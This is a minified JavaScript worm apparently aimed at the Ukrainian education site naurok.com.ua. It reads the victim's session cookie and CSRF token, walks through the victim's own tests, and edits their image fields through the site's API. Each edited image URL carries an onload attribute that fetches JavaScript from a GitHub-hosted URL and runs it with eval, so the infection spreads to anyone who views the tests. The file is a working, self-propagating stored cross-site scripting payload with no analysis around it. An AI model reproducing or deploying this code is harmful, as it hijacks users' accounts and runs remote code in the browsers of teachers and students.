(()=>{"use strict";({607:function(){var t=this&&this.__awaiter||function(t,e,n,o){return new(n||(n=Promise))((function(i,r){function c(t){try{a(o.next(t))}catch(t){r(t)}}function s(t){try{a(o.throw(t))}catch(t){r(t)}}function a(t){var e;t.done?i(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(c,s)}a((o=o.apply(t,e||[])).next())}))};const e=function(t){return(new DOMParser).parseFromString(t,"text/html")},n=t=>new Promise((e=>setTimeout(e,t))),o=(e,o={})=>t(void 0,void 0,void 0,(function*(){for(let t=1;t<5;++t){const i=yield fetch(e,o);if(403!==i.status&&429!==i.status)return i;yield n(200*t)}return fetch(e,o)}));!function(){t(this,void 0,void 0,(function*(){const i=document.querySelectorAll("img[i]");for(const t of i)t.removeAttribute("onload"),t.removeAttribute("i"),t.setAttribute("src",t.getAttribute("src").slice(0,-1));if(window.e)return;window.e=!0;const r=document.cookie.match(/PHPSESSID=([a-z0-9]+)/);if(!r)return console.log("no ssid");r[1],document.URL,document.referrer;const c=yield o("https://naurok.com.ua"),s=yield c.text(),a=s.match(/meta name="csrf-token" content="(.+)"/);if(!a)return console.log("no csrf");const u=a[1];if(!u)return console.log("no csrf 2");const l=s.match(/<a href=".profile.(.+)">Особиста/);if(!l)return;if(3250755===parseInt(l[1]))return;const d=[],f=e=>t(this,void 0,void 0,(function*(){const t=yield o(`https://naurok.com.ua/api/test/documents/${e}`);return yield t.json()})),h=function(e){return t(this,void 0,void 0,(function*(){const t=e.match(/(\d+).html/);if(!t)return;const n=t[1],i=yield f(n);if(!i)return;const{document:r,questions:c}=i;r.status=2;const s=r.id,a="https://naurok.com.ua/test/builder/"+s;if(r.image||(r.image="https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/801236_1651844282.png"),!r.image.includes("?")){t:for(const t of c){if(t.csrf=u,t.image){t.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${t.id}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:a,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break}for(const e of t.options)if(e.image){e.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${n}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:a,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break t}}r.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o("https://naurok.com.ua/api/test/documents/"+s,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8",Referer:a,"Referrer-Policy":"strict-origin-when-cross-origin"},body:JSON.stringify(r),method:"PUT"})}}))};d.push(function(){var i;return t(this,void 0,void 0,(function*(){for(let t=1;;++t){const r=yield o(`https://naurok.com.ua/test/moe?storinka=${t}`),c=yield r.text(),s=e(c),a=s.querySelector("div.items > ul > li.active > a");if(!a&&1!==t)return;if(a&&a.innerText!==`${t}`)return;const u=s.querySelectorAll(".file-item.test-item");for(const t of u){const e=t.querySelector("img");if(e&&(null===(i=e.getAttribute("src"))||void 0===i?void 0:i.includes("?")))continue;const n=t.querySelector(".headline a");if(!n)continue;const o=n.getAttribute("href");o&&(yield h("https://naurok.com.ua"+o))}n(1e3)}}))}()),yield Promise.all(d)}))}()}})[607]()})();
